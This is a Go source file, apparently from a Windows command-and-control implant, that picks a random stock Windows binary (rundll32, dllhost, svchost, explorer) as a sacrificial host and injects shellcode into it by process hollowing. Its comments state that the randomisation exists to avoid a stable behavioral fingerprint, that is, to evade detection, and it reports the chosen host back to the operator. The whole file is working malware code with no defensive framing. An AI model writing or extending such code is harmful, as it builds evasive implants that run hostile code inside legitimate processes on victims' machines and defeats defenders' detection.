//go:build windows
// +build windows

package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
)

// Random benign-host selection for spawn-and-inject techniques.
//
// A fixed hollow/spawn host (e.g. always rundll32.exe) is a stable
// behavioral fingerprint across samples. These helpers pick a per-call
// random host from a pool of ordinary Windows binaries and fall back through
// the remaining pool on failure, so one bad host never fails the task.

// benignHollowHosts is the pool of sacrificial process images for
// process-hollowing style techniques. All are stock Windows binaries that
// look unremarkable as suspended children; the operator's explicit choice
// (via spawn targetExe) always wins over this pool.
var benignHollowHosts = []string{
	"rundll32.exe",
	"dllhost.exe",
	"svchost.exe",
	"explorer.exe",
}

// lastHollowHost records the image used by the most recent successful
// hollow-style injection so task handlers can report it to the operator.
var lastHollowHost string

// shuffledHollowHosts returns the pool in per-call random order (Fisher-Yates
// over crypto/rand; falls back to pool order when randomness is unavailable).
func shuffledHollowHosts() []string {
	order := append([]string(nil), benignHollowHosts...)
	for i := len(order) - 1; i > 0; i-- {
		var b [4]byte
		if _, err := rand.Read(b[:]); err != nil {
			break
		}
		j := int(binary.LittleEndian.Uint32(b[:]) % uint32(i+1))
		order[i], order[j] = order[j], order[i]
	}
	return order
}

// hollowProcessRandomHost hollows the first host in a per-call random order
// that succeeds. It returns the host image used.
func hollowProcessRandomHost(shellcode []byte) (string, error) {
	var firstErr error
	for _, host := range shuffledHollowHosts() {
		if err := hollowProcess(host, shellcode); err == nil {
			lastHollowHost = host
			return host, nil
		} else if firstErr == nil {
			firstErr = err
		}
	}
	if firstErr == nil {
		firstErr = fmt.Errorf("hollow failed on all benign hosts")
	}
	return "", firstErr
}
